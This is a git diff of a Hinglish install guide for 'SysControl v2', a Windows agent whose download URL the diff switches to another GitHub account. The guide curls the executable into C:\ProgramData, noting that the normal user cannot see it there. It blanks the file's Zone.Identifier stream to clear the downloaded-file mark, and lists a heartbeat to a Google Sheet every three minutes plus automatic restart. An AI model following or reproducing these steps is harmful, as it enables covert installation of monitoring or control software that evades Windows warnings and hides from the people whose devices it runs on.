@@ -1,27 +1,28 @@
 # SysControl v2 — Install Guide
 
+> Ab manual build/upload ki zaroorat nahi. Bas code push karo — sab automatic hai.
+> GitHub Actions khud .exe build karke release bana deta hai.
+
 ---
 
 ## APNE LAPTOP PAR (Pehle Karo — Ek Baar)
 
-### 1. Build the .exe
+### Release kaise hota hai (Automatic)
 
-```
-cd D:\Code\SysControl-v2\backend
-build.bat
-```
+Ab manual build + upload nahi karna padta. Bas ye karo:
 
-Ye `backend\dist\SystemMonitor.exe` banayega.
+1. `backend/VERSION` file me naya version number likho (e.g. `3.3.0`)
+2. Git push karo:
+   ```
+   git add -A; git commit -m "Release v3.3.0"; git push
+   ```
+3. GitHub Actions automatic:
+   - `.exe` build karega (Windows runner par)
+   - GitHub Release bana dega with `.exe` attached
+   - Google Sheet "Updates" tab me naya row add karega
+   - Devices ko frontend me "Update Available" dikhega
 
-### 2. GitHub Release par upload karo
-
-1. Jao: https://github.com/ajit421/SysControl-v2/releases
-2. Click: **Draft a new release**
-3. Tag: `v2.3.0` — Title: `v2.3.0`
-4. **Attach files** me `backend\dist\SystemMonitor.exe` drag karo
-5. Click: **Publish release**
-
-> Ye ek baar karo. Har update ke baad naya release banao.
+> Manual build sirf testing ke liye: `cd backend && build.bat`
 
 ---
 
@@ -62,7 +63,7 @@ mkdir C:\ProgramData\SystemMonitor
 ```
 
 ```cmd
-curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/ajit421/SysControl-v2/releases/latest/download/SystemMonitor.exe
+curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
 ```
 
 > `C:\ProgramData` Windows me by default hidden hota hai — normal user ko dikhta nahi.
@@ -123,8 +124,6 @@ mkdir C:\ProgramData\SystemMonitor
 curl -L -o C:\ProgramData\SystemMonitor\SystemMonitor.exe https://github.com/le0-le0/SysControl-v2/releases/latest/download/SystemMonitor.exe
 ```
 
-
-
 ```cmd
 echo. > "C:\ProgramData\SystemMonitor\SystemMonitor.exe:Zone.Identifier"
 ```
@@ -152,6 +151,8 @@ tasklist | findstr SystemMonitor
 | Google Sheet me register | Har 3 minute heartbeat bhejta hai |
 | Crash recovery | Crash hone par 10 sec baad khud restart |
 | Hidden location | `C:\ProgramData\SystemMonitor\` — user ko dikhta nahi |
+| Auto-update detection | Frontend me "Update Available" dikhata hai jab naya release aata hai |
+| CI/CD | GitHub push par .exe automatic build + release hota hai |
 
 ---
 
